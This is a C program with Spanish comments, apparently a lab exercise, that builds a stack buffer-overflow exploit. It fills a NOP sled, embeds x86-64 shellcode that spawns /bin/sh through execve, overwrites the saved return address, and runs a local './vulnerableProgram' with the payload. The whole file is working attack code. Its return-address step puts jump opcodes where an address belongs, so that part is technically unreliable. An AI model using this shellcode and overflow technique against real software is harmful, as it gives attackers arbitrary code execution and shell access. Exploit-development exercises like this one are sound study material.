#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#define PAYLOAD_SIZE (64 + 8 + 8 + 1)  // 64 (buffer) + 8 (saved RBP) + 8 (ret) + 1 (extra para el indicar el final de string)

int main(int argc, char *argv[]) {
  unsigned char payload[PAYLOAD_SIZE];

  // Inicializa el payload con NOPs (0x90) -> NOP sled
  memset(payload, 0x90, PAYLOAD_SIZE - 1);

  // Colocamos el indicador de final de string en el byte extra
  payload[PAYLOAD_SIZE - 1] = '\0';

  unsigned char *p = payload; // puntero al payload para recorrerlo desde el inicio

  // Version: shellcode_noNull
  unsigned char shellcode[] =
    "\x48\x31\xc0"                              // xor    rax, rax
    "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  // mov    rbx, 0x68732f2f6e69622f  -> "/bin//sh"
    "\x53"                                      // push   rbx
    "\x48\x89\xe7"                              // mov    rdi, rsp
    "\x50"                                      // push   rax    ; coloca 0 en la pila (NULL execve : final de argumentos)
    "\x57"                                      // push   rdi    ; apunta a "/bin//sh"
    "\x48\x89\xe6"                              // mov    rsi, rsp
    "\x48\x83\xc0\x3b"                          // add    rax, 0x3b  ; número de syscall para execve
    "\x0f\x05";                                 // syscall

  // Inyectar shellcode en el payload
  p += 8; // saltamos 8 NOPs
  memcpy(p, shellcode, sizeof(shellcode)-1); // -1 para quitar el byte nulo del final 0x00

  // Sobreescribir la dirección de retorno por instruccion de salto hacia atras
  p = payload;
  p += (64 + 8); // avanzamos al lugar de la dirección de retorno
  unsigned char ret_jump[8] = { // instrucción de salto corto para volver al inicio del payload
    0xeb, 0xba, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90
  };
  memcpy(p, ret_jump, sizeof(ret_jump));
  //payload[81] = 0x00;

  printf("Size of payload is %lu.\n", sizeof(payload));
  printf("La dirección de inicio del payload en la pila es %p\n", payload);

  // Imprimimos el payload en hexadecimal para verificar
  for (size_t i = 0; i < sizeof(payload); i++){
    printf("%02x ", (unsigned char)payload[i]); // Imprime cada byte en formato hexadecimal
    if ((i + 1) % 16 == 0) printf("\n");  // Salto de línea cada 16 bytes para mejor visualización
  }
  printf("\n");

  // Ejecutar el programa vulnerable con el payload como argumento
  char *args[] = {"./vulnerableProgram", (unsigned char *)payload, NULL};
  if (execve("./vulnerableProgram", args, NULL) == -1) {
    perror("Error en execve");
    return -1;
  }

  return 0;
}

 